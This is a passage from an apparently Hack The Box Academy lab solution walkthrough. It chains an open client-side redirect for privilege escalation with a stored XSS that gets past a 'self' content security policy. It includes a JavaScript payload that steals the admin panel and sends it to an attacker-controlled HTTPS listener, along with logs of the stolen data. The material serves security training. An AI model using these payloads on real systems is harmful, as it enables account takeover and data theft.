0idWkgc21hbGwgbW9kYWwiPgoJCSAgICA8ZGl2IGNsYXNzPSJoZWFkZXIiPgoJCSAgICAgIERlbGV0ZSBUaGlzIEVudHJ5CgkJICAgIDwvZGl2PgoJCSAgICA8ZGl2IGNsYXNzPSJjb250ZW50Ij4KCQkgICAgICA8cD5BcmUgeW91IHN1cmUgeW91IHdhbnQgdG8gZGVsZXRlIHRoaXMgZW50cnk/PC9wPgoJCSAgICA8L2Rpdj4KCQkgICAgPGRpdiBjbGFzcz0iYWN0aW9ucyI+CgkJICAgICAgPGRpdiBjbGFzcz0idWkgbmVnYXRpdmUgYnV0dG9uIj4KCQkgICAgICAgIE5vCgkJICAgICAgPC9kaXY+CgkJICAgICAgPGRpdiBjbGFzcz0idWkgcG9zaXRpdmUgcmlnaHQgbGFiZWxlZCBpY29uIGJ1dHRvbiI+CgkJICAgICAgICBZZXMKCQkgICAgICAgIDxpIGNsYXNzPSJjaGVja21hcmsgaWNvbiI+PC9pPgoJCSAgICAgIDwvZGl2PgoJCSAgICA8L2Rpdj4KCQkgIDwvZGl2PgoJPC9ib2R5PgoJPHNjcmlwdCB0eXBlPSJ0ZXh0L2phdmFzY3JpcHQiPgoJCSQoJy5zbWFsbC5tb2RhbCcpCgkJICAubW9kYWwoJ2F0dGFjaCBldmVudHMnLCAnLmRlbGV0ZS5idXR0b24nLCAnc2hvdycpOwoJCTsKCTwvc2NyaXB0Pgo8L2h0bWw+Cg== | base64 -d | grep HTB
										<p>HTB{1e9069021a3b73f41dc230f3e3ef5685}</p>
```

Answer: `HTB{1e9069021a3b73f41dc230f3e3ef5685}`

# Skills Assessment

## Question 1

### "Obtain the flag."

Students need to first add the necessary vHosts to their `/etc/hosts` file:

Code: shell

```shell
sudo sh -c 'echo "STMIP exploitserver.htb vulnerablesite.htb" >> /etc/hosts'
```

```
┌─[eu-academy-5]─[10.10.14.64]─[htb-ac-8414@htb-2gnz3ymbg3]─[~]
└──╼ [★]$ sudo sh -c 'echo "10.129.233.63 exploitserver.htb vulnerablesite.htb" >> /etc/hosts'
```

Next, students need to open Burp Suite, then subsequently open Firefox and browse to `https://vulnerablesite.htb` while intercepting the request. Students need to forward the initial request, then forward the redirect to `/login.php` and inspect the server response. Note the students may need to remove the `Cookie:` header before sending the request:

![[HTB Solutions/CWEE/z. images/5930b99b686a5ef6d00573754cf77595_MD5.jpg]]

Students will find that the server's content security policy is set to `script-src 'self'`, where scripts from the same origin as the document are allowed to execute. This prevents the execution of scripts that are not hosted on the originating server. Additionally, the `Set-Cookie` header is set to `HttpOnly` (which instructs the browser that the cookie can only be accessed by the server and not by the client-side scripts) and `SameSite=Strict` (which allows cookies to only be sent if the request originates from the same site that set the cookie).

Now, students need to turn off Burp Suite's Intercept and log in to the vulnerable site (`https://vulnerablesite.htb`) using the credentials `htb-stdnt:Academy_student!`. Upon logging in, students will find links on the left-hand side of the page for Dashboard, File Management, User Management, Task Management, Admin Panel, and Logout:

![[HTB Solutions/CWEE/z. images/8c003d17f8dba545badf426ef718372e_MD5.jpg]]

Students need to go to User Management, then click the button `Promote` the `htb-stdnt` user:

![[HTB Solutions/CWEE/z. images/ee951300c688db150f7183279b17e179_MD5.jpg]]

Students will find that the promotion attempt makes a request to `/users.php?userid=3`. However, students will also receive the message that "Only moderators and administrators can promote other users!":

![[HTB Solutions/CWEE/z. images/6d79be0ff4a8482194386b972bf3eb48_MD5.jpg]]

Consequently, students will need to find a way to have the victim moderator user perform the action of promoting the `htb-stdnt` user.

Students need to press the `Logout` button on the left-hand side of the page, and intercept it with Burp Suite:

![[HTB Solutions/CWEE/z. images/e29b0bc30362cd3375f22d6734d131cb_MD5.jpg]]

Forwarding the request, students will find the next request is to the endpoint `/index.php?next=/login.php`:

![[HTB Solutions/CWEE/z. images/edf84744d7f9fd98663a27005a5c48e1_MD5.jpg]]

Identifying a client-side redirect, students need to craft a payload on the exploit server (`https://exploitserver.htb`) forcing the victim to visit this endpoint (albeit modified to redirect to `/users.php?userid=3` rather tan `/login.php`, causing a promotion of the `htb-stdnt` user):

Code: html

```html
<script>
document.location = "https://vulnerablesite.htb/index.php?next=/users.php%3fuserid=3";
</script>
```

![[HTB Solutions/CWEE/z. images/d70f882a0fde84c2b716fb883a4ba23a_MD5.jpg]]

Students need to press `Save` and then `Deliver to Victim`. Then, students need to log back into the vulnerable site and check the User Management tab, confirming they have the moderator role:

![[HTB Solutions/CWEE/z. images/b729c55192f064d424361100ac3be9b7_MD5.jpg]]

With the moderator role, students are now able to add new tasks within the Task Management portion of the vulnerable site, creating an XSS attack vector against the administrator user, who frequently monitors the tasks:

![[HTB Solutions/CWEE/z. images/a9470654f47ec9a5dc07420af6a041a1_MD5.jpg]]

However, submitting the payload `<script>alert("1")</script>` as a new task, students will find the page does not execute inline javascript, as no alert appears on screen:

![[HTB Solutions/CWEE/z. images/aec880e282f331dcef0cce2d2ad3e6ec_MD5.jpg]]

Therefore, students need to use the File Management page to upload a text file containing the javascript payload, then subsequently submit a payload to the Task Management page that references the text file as the script source:

Code: shell

```shell
echo 'alert("1")' > alert.txt
```

```
┌─[eu-academy-5]─[10.10.14.64]─[htb-ac-8414@htb-2gnz3ymbg3]─[~]
└──╼ [★]$ echo 'alert("1")' > alert.txt
```

![[HTB Solutions/CWEE/z. images/b33d56a160e1e10c9d8dabd41b61b588_MD5.jpg]]

After selecting the `alert.txt` file and pressing `Upload`, students need to click `Access` to view the text file along with its URL:

![[HTB Solutions/CWEE/z. images/aebe1201495993f973a5da3df8534938_MD5.jpg]]

![[HTB Solutions/CWEE/z. images/5350e03dd286158ebea2e2d4543e0178_MD5.jpg]]

Now, students need to return to Task Management, and add a task that references the uploaded text file as a script:

Code: html

```html
<script src="https://vulnerablesite.htb/display_file.php?file_id=1"></script>
```

![[HTB Solutions/CWEE/z. images/82d77483efb9bd5cf1c654c7793b5c3c_MD5.jpg]]

![[HTB Solutions/CWEE/z. images/29fe4a3d20115475ade1f775c237be25_MD5.jpg]]

Confirming the functionality of the XSS vulnerability, students need to repeat this process, uploading a new text file containing a javascript payload to exfiltrate the contents of the Admin Panel (in this example, we have named the file `admin_panel.txt`):

Code: javascript

```javascript
var xhr = new XMLHttpRequest();
xhr.open('GET', '/admin.php', false);
xhr.withCredentials = true;
xhr.send();

var exfil = new XMLHttpRequest();
exfil.open("GET", "https://PWNIP:PWNPO/exfil?r=" + btoa(xhr.responseText), false);
exfil.send();
```

![[HTB Solutions/CWEE/z. images/4de8ab5fdb2c571ce42c4dcd7de282c5_MD5.jpg]]

![[HTB Solutions/CWEE/z. images/78727d41d1c6ddc2781e758bf054527d_MD5.jpg]]

Before adding new tasks, students will proceed to create the Python3 HTTPS server:

Code: shell

```shell
cat << EOF > server.py
from http import server
import ssl

httpd = server.HTTPServer(('0.0.0.0', PWNPO), server.SimpleHTTPRequestHandler)
httpd.socket = ssl.wrap_socket (httpd.socket, certfile='./server.pem', server_side=True)
httpd.serve_forever()
EOF
```

```
┌─[eu-academy-5]─[10.10.14.64]─[htb-ac-8414@htb-5mnalktjic]─[~]
└──╼ [★]$ cat << EOF > server.py
from http import server
import ssl

httpd = server.HTTPServer(('0.0.0.0', 4443), server.SimpleHTTPRequestHandler)
httpd.socket = ssl.wrap_socket (httpd.socket, certfile='./server.pem', server_side=True)
httpd.serve_forever()
EOF
```

Subsequently, students will generate a self-signed certificate with blank information using `openssl`:

Code: shell

```shell
openssl req -new -x509 -keyout server.pem -out server.pem -days 365 -nodes
```

```
┌─[eu-academy-5]─[10.10.14.64]─[htb-ac-8414@htb-5mnalktjic]─[~]
└──╼ [★]$ openssl req -new -x509 -keyout server.pem -out server.pem -days 365 -nodes

<SNIP>

-----
Country Name (2 letter code) [AU]:
State or Province Name (full name) [Some-State]:
Locality Name (eg, city) []:
Organization Name (eg, company) [Internet Widgits Pty Ltd]:
Organizational Unit Name (eg, section) []:
Common Name (e.g. server FQDN or YOUR name) []:
Email Address []:
```

Students will start the HTTPS Python server:

Code: shell

```shell
python3 server.py
```

```
┌─[eu-academy-5]─[10.10.14.45]─[htb-ac-8414@htb-pktwoi3cwr]─[~]
└──╼ [★]$ python3 server.py 

/home/htb-ac-8414/server.py:5: DeprecationWarning: ssl.wrap_socket() is deprecated, use SSLContext.wrap_socket()
  httpd.socket = ssl.wrap_socket (httpd.socket, certfile='./server.pem', server_side=True)
```

Students will submit the new task:

![[HTB Solutions/CWEE/z. images/9d998bbbafae9622bf619f9d45c0bd09_MD5.jpg]]

`Note:` For the rest of the assessment, students will need to continue this process of saving each payload as a text file, uploading it through the file management page, and subsequently referencing it as an external script on the task management page. Consequently, these steps will not be explicitly shown in the instructions moving forward.

After a few moments, students need to check their exfiltration server:

```
┌─[eu-academy-5]─[10.10.14.64]─[htb-ac-8414@htb-2gnz3ymbg3]─[~]
└──╼ [★]$ python3 server.py

/home/htb-ac-8414/server.py:5: DeprecationWarning: ssl.wrap_socket() is deprecated, use SSLContext.wrap_socket()
  httpd.socket = ssl.wrap_socket (httpd.socket, certfile='./server.pem', server_side=True)
  
10.129.233.63 - - [28/Jan/2025 06:52:15] code 404, message File not found
10.129.233.63 - - [28/Jan/2025 06:52:15] "GET /exfil?r=CjwhRE9DVFlQRSBodG1sPgo8aHRtbCBsYW5nPSJlbiI+CiAgPGhlYWQ+CiAgICA8YmFzZSBocmVmPSIuLyI+CiAgICA8bWV0YSBjaGFyc2V0PSJ1dGYtOCI+CiAgICA8bWV0YSBodHRwLWVxdWl2PSJYLVVBLUNvbXBhdGlibGUiIGNvbnRlbnQ9IklFPWVkZ2UiPgogICAgPG1ldGEgbmFtZT0idmlld3BvcnQiIGNvbnRlbnQ9IndpZHRoPWRldmljZS13aWR0aCwgaW5pdGlhbC1zY2FsZT0xLjAsIHNocmluay10by1maXQ9bm8iPgogICAgPG1ldGEgbmFtZT0iZGVzY3JpcHRpb24iIGNvbnRlbnQ9IkNvcmVVSSAtIE9wZW4gU291cmNlIEJvb3RzdHJhcCBBZG1pbiBUZW1wbGF0ZSI+CiAgICA8bWV0YSBuYW1lPSJhdXRob3IiIGNvbnRlbnQ9IiI+CiAgICA8dGl0bGU+Q29yZVVJIEZyZWUgQm9vdHN0cmFwIEFkbWluIFRlbXBsYXRlPC90aXRsZT4KICAgIDxsaW5rIHJlbD0ibWFuaWZlc3QiIGhyZWY9ImFzc2V0cy9mYXZpY29uL21hbmlmZXN0Lmpzb24iPgogICAgPG1ldGEgbmFtZT0ibXNhcHBsaWNhdGlvbi1UaWxlQ29sb3IiIGNvbnRlbnQ9IiNmZmZmZmYiPgogICAgPG1ldGEgbmFtZT0ibXNhcHBsaWNhdGlvbi1UaWxlSW1hZ2UiIGNvbnRlbnQ9ImFzc2V0cy9mYXZpY29uL21zLWljb24tMTQ0eDE0NC5wbmciPgogICAgPG1ldGEgbmFtZT0idGhlbWUtY29sb3IiIGNvbnRlbnQ9IiNmZmZmZmYiPgogICAgPCEtLSBWZW5kb3JzIHN0eWxlcy0tPgogICAgPGxpbmsgcmVsPSJzdHlsZXNoZWV0IiBocmVmPSJ2ZW5kb3JzL3NpbXBsZWJhci9jc3Mvc2ltcGxlYmFyLmNzcyI+CiAgICA8bGluayByZWw9InN0eWxlc2hlZXQiIGhyZWY9ImNzcy92ZW5kb3JzL3NpbXBsZWJhci5jc3MiPgogICAgPCEtLSBNYWluIHN0eWxlcyBmb3IgdGhpcyBhcHBsaWNhdGlvbi0tPgogICAgPGxpbmsgaHJlZj0iY3NzL3N0eWxlLmNzcyIgcmVsPSJzdHlsZXNoZWV0Ij4KICAgIDwhLS0gV2UgdXNlIHRob3NlIHN0eWxlcyB0byBzaG93IGNvZGUgZXhhbXBsZXMsIHlvdSBzaG91bGQgcmVtb3ZlIHRoZW0gaW4geW91ciBhcHBsaWNhdGlvbi4tLT4KICAgIDxsaW5rIGhyZWY9ImNzcy9leGFtcGxlcy5jc3MiIHJlbD0ic3R5bGVzaGVldCI+CiAgICA8bGluayBocmVmPSJ2ZW5kb3JzL0Bjb3JldWkvY2hhcnRqcy9jc3MvY29yZXVpLWNoYXJ0anMuY3NzIiByZWw9InN0eWxlc2hlZXQiPgogIDwvaGVhZD4KICA8Ym9keT4KICAgIDxkaXYgY2xhc3M9IndyYXBwZXIgZC1mbGV4IGZsZXgtY29sdW1uIG1pbi12aC0xMDAgYmctbGlnaHQiPgogICAgICA8aGVhZGVyIGNsYXNzPSJoZWFkZXIgaGVhZGVyLXN0aWNreSBtYi00Ij4KICAgICAgICA8ZGl2IGNsYXNzPSJoZWFkZXItZGl2aWRlciI+PC9kaXY+CiAgICAgICAgPGRpdiBjbGFzcz0iY29udGFpbmVyLWZsdWlkIj4KICAgICAgICAgIDxuYXYgYXJpYS1sYWJlbD0iYnJlYWRjcnVtYiI+CiAgICAgICAgICAgIDxvbCBjbGFzcz0iYnJlYWRjcnVtYiBteS0wIG1zLTIiPgogICAgICAgICAgICAgIDxsaSBjbGFzcz0iYnJlYWRjcnVtYi1pdGVtIj4KICAgICAgICAgICAgICAgIDwhLS0gaWYgYnJlYWRjcnVtYiBpcyBzaW5nbGUtLT48c3Bhbj5Ib21lPC9zcGFuPgogICAgICAgICAgICAgIDwvbGk+CiAgICAgICAgICAgICAgPGxpIGNsYXNzPSJicmVhZGNydW1iLWl0ZW0gYWN0aXZlIj48c3Bhbj5BZG1pbiBQYW5lbDwvc3Bhbj48L2xpPgogICAgICAgICAgICA8L29sPgogICAgICAgICAgPC9uYXY+CiAgICAgICAgPC9kaXY+CiAgICAgIDwvaGVhZGVyPgogICAgICA8ZGl2IGNsYXNzPSJib2R5IGZsZXgtZ3Jvdy0xIHB4LTMiPgogICAgICAgIDxkaXYgY2xhc3M9ImNvbnRhaW5lci1sZyI+CiAgICAgICAgICA8ZGl2IGNsYXNzPSJjYXJkIG1iLTQiPgogICAgICAgICAgICA8ZGl2IGNsYXNzPSJjYXJkLWJvZHkiPgogICAgICAgICAgICAgIDxkaXYgY2xhc3M9ImQtZmxleCBqdXN0aWZ5LWNvbnRlbnQtYmV0d2VlbiI+CiAgICAgICAgICAgICAgICA8ZGl2PgogICAgICAgICAgICAgICAgICA8aDQgY2xhc3M9ImNhcmQtdGl0bGUgbWItMCI+QWRtaW4gUGFuZWwgLSBDdXN0b21lcnM8L2g0PgogICAgICAgICAgICAgICAgPC9kaXY+CiAgICAgICAgICAgICAgPC9kaXY+CgogICAgICAgICAgICAgIDwhLS0gTG9hZCBkYXRhIGZyb20gQVBJIC0tPgogICAgICAgICAgICAgIDxzY3JpcHQgc3JjPSJqcy9hcGkuanMiPjwvc2NyaXB0PgoKICAgICAgICAgICAgICA8ZGl2IGNsYXNzPSJ0YWJsZS1yZXNwb25zaXZlIj4KICAgICAgICAgICAgICAgICAgICA8dGFibGUgY2xhc3M9InRhYmxlIGJvcmRlciBtYi0wIiBpZD0ibXlUYWJsZSI+CiAgICAgICAgICAgICAgICAgICAgICA8dGhlYWQgY2xhc3M9InRhYmxlLWxpZ2h0IGZ3LXNlbWlib2xkIj4KICAgICAgICAgICAgICAgICAgICAgICAgPHRyIGNsYXNzPSJhbGlnbi1taWRkbGUiPgogICAgICAgICAgICAgICAgICAgICAgICAgIDx0aD5OYW1lPC90aD4KICAgICAgICAgICAgICAgICAgICAgICAgICA8dGg+QWRkcmVzczwvdGg+CiAgICAgICAgICAgICAgICAgICAgICAgIDwvdHI+CiAgICAgICAgICAgICAgICAgICAgICA8L3RoZWFkPgogICAgICAgICAgICAgICAgICAgICAgPHRib2R5PgogICAgICAgICAgICAgICAgICAgICAgPC90Ym9keT4KICAgICAgICAgICAgICAgICAgICA8L3RhYmxlPgogICAgICAgICAgICAgICAgICA8L2Rpdj4KCiAgICAgICAgICAgIDwvZGl2PgogICAgICAgICAgPC9kaXY+CiAgICAgICAgICA8IS0tIC8uY2FyZC5tYi00LS0+CiAgICAgICAgPC9kaXY+CiAgICAgIDwvZGl2PgogICAgPC9kaXY+CiAgICA8IS0tIENvcmVVSSBhbmQgbmVjZXNzYXJ5IHBsdWdpbnMtLT4KICAgIDxzY3JpcHQgc3JjPSJ2ZW5kb3JzL0Bjb3JldWkvY29yZXVpL2pzL2NvcmV1aS5idW5kbGUubWluLmpzIj48L3NjcmlwdD4KICAgIDxzY3JpcHQgc3JjPSJ2ZW5kb3JzL3NpbXBsZWJhci9qcy9zaW1wbGViYXIubWluLmpzIj48L3NjcmlwdD4KICAgIDwhLS0gUGx1Z2lucyBhbmQgc2NyaXB0cyByZXF1aXJlZCBieSB0aGlzIHZpZXctLT4KICAgIDxzY3JpcHQgc3JjPSJ2ZW5kb3JzL2NoYXJ0LmpzL2pzL2NoYXJ0Lm1pbi5qcyI+PC9zY3JpcHQ+CiAgICA8c2NyaXB0IHNyYz0idmVuZG9ycy9AY29yZXVpL2NoYXJ0anMvanMvY29yZXVpLWNoYXJ0anMuanMiPjwvc2NyaXB0PgogICAgPHNjcmlwdCBzcmM9InZlbmRvcnMvQGNvcmV1aS91dGlscy9qcy9jb3JldWktdXRpbHMuanMiPjwvc2NyaXB0PgogICAgPHNjcmlwdCBzcmM9ImpzL21haW4uanMiPjwvc2NyaXB0PgogICAgPHNjcmlwdCBzcmM9ImpzL2xvZ2ljLmpzIj48L3NjcmlwdD4KCiAgPC9ib2R5Pgo8L2h0bWw+ HTTP/1.1" 404 -
```

Students will proceed to decode the Base64 encoded response:

Code: shell

```shell
echo CjwhRE9DVFlQRSBodG1sPgo8aHRtbCBsYW5nPSJlbiI+CiAgPGhlYWQ+CiAgICA8YmFzZSBocmVmPSIuLyI+CiAgICA8bWV0YSBjaGFyc2V0PSJ1dGYtOCI+CiAgICA8bWV0YSBodHRwLWVxdWl2PSJYLVVBLUNvbXBhdGlibGUiIGNvbnRlbnQ9IklFPWVkZ2UiPgogICAgPG1ldGEgbmFtZT0idmlld3BvcnQiIGNvbnRlbnQ9IndpZHRoPWRldmljZS13aWR0aCwgaW5pdGlhbC1zY2FsZT0xLjAsIHNocmluay10by1maXQ9bm8iPgogICAgPG1ldGEgbmFtZT0iZGVzY3JpcHRpb24iIGNvbnRlbnQ9IkNvcmVVSSAtIE9wZW4gU291cmNlIEJvb3RzdHJhcCBBZG1pbiBUZW1wbGF0ZSI+CiAgICA8bWV0YSBuYW1lPSJhdXRob3IiIGNvbnRlbnQ9IiI+CiAgICA8dGl0bGU+Q29yZVVJIEZyZWUgQm9vdHN0cmFwIEFkbWluIFRlbXBsYXRlPC90aXRsZT4KICAgIDxsaW5rIHJlbD0ibWFuaWZlc3QiIGhyZWY9ImFzc2V0cy9mYXZpY29uL21hbmlmZXN0Lmpzb24iPgogICAgPG1ldGEgbmFtZT0ibXNhcHBsaWNhdGlvbi1UaWxlQ29sb3IiIGNvbnRlbnQ9IiNmZmZmZmYiPgogICAgPG1ldGEgbmFtZT0ibXNhcHBsaWNhdGlvbi1UaWxlSW1hZ2UiIGNvbnRlbnQ9ImFzc2V0cy9mYXZpY29uL21zLWljb24tMTQ0eDE0NC5wbmciPgogICAgPG1ldGEgbmFtZT0idGhlbWUtY29sb3IiIGNvbnRlbnQ9IiNmZmZmZmYiPgogICAgPCEtLSBWZW5kb3JzIHN0eWxlcy0tPgogICAgPGxpbmsgcmVsPSJzdHlsZXNoZWV0IiBocmVmPSJ2ZW5kb3JzL3NpbXBsZWJhci9jc3Mvc2ltcGxlYmFyLmNzcyI+CiAgICA8bGluayByZWw9InN0eWxlc2hlZXQiIGhyZWY9ImNzcy92ZW5kb3JzL3NpbXBsZWJhci5jc3MiPgogICAgPCEtLSBNYWluIHN0eWxlcyBmb3IgdGhpcyBhcHBsaWNhdGlvbi0tPgogICAgPGxpbmsgaHJlZj0iY3NzL3N0eWxlLmNzcyIgcmVsPSJzdHlsZXNoZWV0Ij4KICAgIDwhLS0gV2UgdXNlIHRob3NlIHN0eWxlcyB0byBzaG93IGNvZGUgZXhhbXBsZXMsIHlvdSBzaG91bGQgcmVtb3ZlIHRoZW0gaW4geW91ciBhcHBsaWNhdGlvbi4tLT4KICAgIDxsaW5rIGhyZWY9ImNzcy9leGFtcGxlcy5jc3MiIHJlbD0ic3R5bGVzaGVldCI+CiAgICA8bGluayBocmVmPSJ2ZW5kb3JzL0Bjb3JldWkvY2hhcnRqcy9jc3MvY29yZXVpLWNoYXJ0anMuY3NzIiByZWw9InN0eWxlc2hlZXQiPgogIDwvaGVhZD4KICA8Ym9keT4KICAgIDxkaXYgY2xhc3M9IndyYXBwZXIgZC1mbGV4IGZsZXgtY29sdW1uIG1pbi12aC0xMDAgYmctbGlnaHQiPgogICAgICA8aGVhZGVyIGNsYXNzPSJoZWFkZXIgaGVhZGVyLXN0aWNreSBtYi00Ij4KICAgICAgICA8ZGl2IGNsYXNzPSJoZWFkZXItZGl2aWRlciI+PC9kaXY+CiAgICAgICAgPGRpdiBjbGFzcz0iY29udGFpbmVyLWZsdWlkIj4KICAgICAgICAgIDxuYXYgYXJpYS1sYWJlbD0iYnJlYWRjcnVtYiI+CiAgICAgICAgICAgIDxvbCBjbGFzcz0iYnJlYWRjcnVtYiBteS0wIG1zLTIiPgogICAgICAgICAgICAgIDxsaSBjbGFzcz0iYnJlYWRjcnVtYi1pdGVtIj4KICAgICAgICAgICAgICAgIDwhLS0gaWYgYnJlYWRjcnVtYiBpcyBzaW5nbGUtLT48c3Bhbj5Ib21lPC9zcGFuPgogICAgICAgICAgICAgIDwvbGk+CiAgICAgICAgICAgICAgPGxpIGNsYXNzPSJicmVhZGNydW1iLWl0ZW0gYWN0aXZlIj48c3Bhbj5BZG1pbiBQYW5lbDwvc3Bhbj48L2xpPgogICAgICAgICAgICA8L29sPgogICAgICAgICAgPC9uYXY+CiAgICAgICAgPC9kaXY+CiAgICAgIDwvaGVhZGVyPgogICAgICA8ZGl2IGNsYXNzPSJib2R5IGZsZXgtZ3Jvdy0xIHB4LTMiPgogICAgICAgIDxkaXYgY2xhc3M9ImNvbnRhaW5lci1sZyI+CiAgICAgICAgICA8ZGl2IGNsYXNzPSJjYXJkIG1iLTQiPgogICAgICAgICAgICA8ZGl2IGNsYXNzPSJjYXJkLWJvZHkiPgogICAgICAgICAgICAgIDxkaXYgY2xhc3M9ImQtZmxleCBqdXN0aWZ5LWNvbnRlbnQtYmV0d2VlbiI+CiAgICAgICAgICAgICAgICA8ZGl2PgogICAgICAgICAgICAgICAgICA8aDQgY2xhc3M9ImNhcmQtdGl0bGUgbWItMCI+QWRtaW4gUGFuZWwgLSBDdXN0b21lcnM8L2g0PgogICAgICAgICAgICAgICAgPC9kaXY+CiAgICAgICAgICAgICAgPC9kaXY+CgogICAgICAgICAgICAgIDwhLS0gTG9hZCBkYXRhIGZyb20gQVBJIC0tPgogICAgICAgICAgICAgIDxzY3JpcHQgc3JjPSJqcy9hcGkuanMiPjwvc2NyaXB0PgoKICAgICAgICAgICAgICA8ZGl2IGNsYXNzPSJ0YWJsZS1yZXNwb25zaXZlIj4KICAgICAgICAgICAgICAgICAgICA8dGFibGUgY2xhc3M9InRhYmxlIGJvcmRlciBtYi0wIiBpZD0ibXlUYWJsZSI+CiAgICAgICAgICAgICAgICAgICAgICA8dGhlYWQgY2xhc3M9InRhYmxlLWxpZ2h0IGZ3LXNlbWlib2xkIj4KICAgICAgICAgICAgICAgICAgICAgICAgPHRyIGNsYXNzPSJhbGlnbi1taWRkbGUiPgogICAgICAgICAgICAgICAgICAgICAgICAgIDx0aD5OYW1lPC90aD4KICAgICAgICAgICAgICAgICAgICAgICAgICA8dGg+QWRkcmVzczwvdGg+CiAgICAgICAgICAgICAgICAgICAgICAgIDwvdHI+CiAgICAgICAgICAgICAgICAgICAgICA8L3RoZWFkPgogICAgICAgICAgICAgICAgICAgICAgPHRib2R5PgogICAgICAgICAgICAgICAgICAgICAgPC90Ym9keT4KICAgICAgICAgICAgICAgICAgICA8L3RhYmxlPgogICAgICAgICAgICAgICAgICA8L2Rpdj4KCiAgICAgICAgICAgIDwvZGl2PgogICAgICAgICAgPC9kaXY+CiAgICAgICAgICA8IS0tIC8uY2FyZC5tYi00LS0+CiAgICAgICAgPC9kaXY+CiAgICAgIDwvZGl2PgogICAgPC9kaXY+CiAgICA8IS0tIENvcmVVSSBhbmQgbmVjZXNzYXJ5IHBsdWdpbnMtLT4KICAgIDxzY3JpcHQgc3JjPSJ2ZW5kb3JzL0Bjb3JldWkvY29yZXVpL2pzL2NvcmV1aS5idW5kbGUubWluLmpzIj48L3NjcmlwdD4KICAgIDxzY3JpcHQgc3JjPSJ2ZW5kb3JzL3NpbXBsZWJhci9qcy9zaW1wbGViYXIubWluLmpzIj48L3NjcmlwdD4KICAgIDwhLS0gUGx1Z2lucyBhbmQgc2NyaXB0cyByZXF1aXJlZCBieSB0aGlzIHZpZXctLT4KICAgIDxzY3JpcHQgc3JjPSJ2ZW5kb3JzL2NoYXJ0LmpzL2pzL2NoYXJ0Lm1pbi5qcyI+PC9zY3JpcHQ+CiAgICA8c2NyaXB0IHNyYz0idmVuZG9ycy9AY29yZXVpL2NoYXJ0anMvanMvY29yZXVpLWNoYXJ0anMuanMiPjwvc2NyaXB0PgogICAgPHNjcmlwdCBzcmM9InZlbmRvcnMvQGNvcmV1aS91dGlscy9qcy9jb3JldWktdXRpbHMuanMiPjwvc2NyaXB0PgogICAgPHNjcmlwdCBzcmM9ImpzL21haW4uanMiPjwvc2NyaXB0PgogICAgPHNjcmlwdCBzcmM9ImpzL2xvZ2ljLmpzIj48L3NjcmlwdD4KCiAgPC9ib2R5Pgo8L2h0bWw+ | base64 -d
```

```
┌─[eu-academy-5]─[10.10.14.64]─[htb-ac-8414@htb-2gnz3ymbg3]─[~]
└──╼ [★]$ echo CjwhRE9DVFlQRSBodG1sPgo8aHRtbCBsYW5nPSJlbiI+CiAgPGhlYWQ+CiAgICA8YmFzZSBocmVmPSIuLyI+CiAgICA8bWV0YSBjaGFyc2V0PSJ1dGYtOCI+CiAgICA8bWV0YSBodHRwLWVxdWl2PSJYLVVBLUNvbXBhdGlibGUiIGNvbnRlbnQ9IklFPWVkZ2UiPgogICAgPG1ldGEgbmFtZT0idmlld3BvcnQiIGNvbnRlbnQ9IndpZHRoPWRldmljZS13aWR0aCwgaW5pdGlhbC1zY2FsZT0xLjAsIHNocmluay10by1maXQ9bm8iPgogICAgPG1ldGEgbmFtZT0iZGVzY3JpcHRpb24iIGNvbnRlbnQ9IkNvcmVVSSAtIE9wZW4gU291cmNlIEJvb3RzdHJhcCBBZG1pbiBUZW1wbGF0ZSI+CiAgICA8bWV0YSBuYW1lPSJhdXRob3IiIGNvbnRlbnQ9IiI+CiAgICA8dGl0bGU+Q29yZVVJIEZyZWUgQm9vdHN0cmFwIEFkbWluIFRlbXBsYXRlPC90aXRsZT4KICAgIDxsaW5rIHJlbD0ibWFuaWZlc3QiIGhyZWY9ImFzc2V0cy9mYXZpY29uL21hbmlmZXN0Lmpzb24iPgogICAgPG1ldGEgbmFtZT0ibXNhcHBsaWNhdGlvbi1UaWxlQ29sb3IiIGNvbnRlbnQ9IiNmZmZmZmYiPgogICAgPG1ldGEgbmFtZT0ibXNhcHBsaWNhdGlvbi1UaWxlSW1hZ2UiIGNvbnRlbnQ9ImFzc2V0cy9mYXZpY29uL21zLWljb24tMTQ0eDE0NC5wbmciPgogICAgPG1ldGEgbmFtZT0idGhlbWUtY29sb3IiIGNvbnRlbnQ9IiNmZmZmZmYiPgogICAgPCEtLSBWZW5kb3JzIHN0eWxlcy0tPgogICAgPGxpbmsgcmVsPSJzdHlsZXNoZWV0IiBocmVmPSJ2ZW5kb3JzL3NpbXBsZWJhci9jc3Mvc2ltcGxlYmFyLmNzcyI+CiAgICA8bGluayByZWw9InN0eWxlc2hlZXQiIGhyZWY9ImNzcy92ZW5kb3JzL3NpbXBsZWJhci5jc3MiPgogICAgPCEtLSBNYWluIHN0eWxlcyBmb3IgdGhpcyBhcHBsaWNhdGlvbi0tPgogICAgPGxpbmsgaHJlZj0iY3NzL3N0eWxlLmNzcyIgcmVsPSJzdHlsZXNoZWV0Ij4KICAgIDwhLS0gV2UgdXNlIHRob3NlIHN0eWxlcyB0byBzaG93IGNvZGUgZXhhbXBsZXMsIHlvdSBzaG91bGQgcmVtb3ZlIHRoZW0gaW4geW91ciBhcHBsaWNhdGlvbi4tLT4KICAgIDxsaW5rIGhyZWY9ImNzcy9leGFtcGxlcy5jc3MiIHJlbD0ic3R5bGVzaGVldCI+CiAgICA8bGluayBocmVmPSJ2ZW5kb3JzL0Bjb3JldWkvY2hhcnRqcy9jc3MvY29yZXVpLWNoYXJ0anMuY3NzIiByZWw9InN0eWxlc2hlZXQiPgogIDwvaGVhZD4KICA8Ym9keT4KICAgIDxkaXYgY2xhc3M9IndyYXBwZXIgZC1mbGV4IGZsZXgtY29sdW1uIG1pbi12aC0xMDAgYmctbGlnaHQiPgogICAgICA8aGVhZGVyIGNsYXNzPSJoZWFkZXIgaGVhZGVyLXN0aWNreSBtYi00Ij4KICAgICAgICA8ZGl2IGNsYXNzPSJoZWFkZXItZGl2aWRlciI+PC9kaXY+CiAgICAgICAgPGRpdiBjbGFzcz0iY29udGFpbmVyLWZsdWlkIj4KICAgICAgICAgIDxuYXYgYXJpYS1sYWJlbD0iYnJlYWRjcnVtYiI+CiAgICAgICAgICAgIDxvbCBjbGFzcz0iYnJlYWRjcnVtYiBteS0wIG1zLTIiPgogICAgICAgICAgICAgIDxsaSBjbGFzcz0iYnJlYWRjcnVtYi1pdGVtIj4KICAgICAgICAgICAgICAgIDwhLS0gaWYgYnJlYWRjcnVtYiBpcyBzaW5nbGUtLT48c3Bhbj5Ib21lPC9zcGFuPgogICAgICAgICAgICAgIDwvbGk+CiAgICAgICAgICAgICAgPGxpIGNsYXNzPSJicm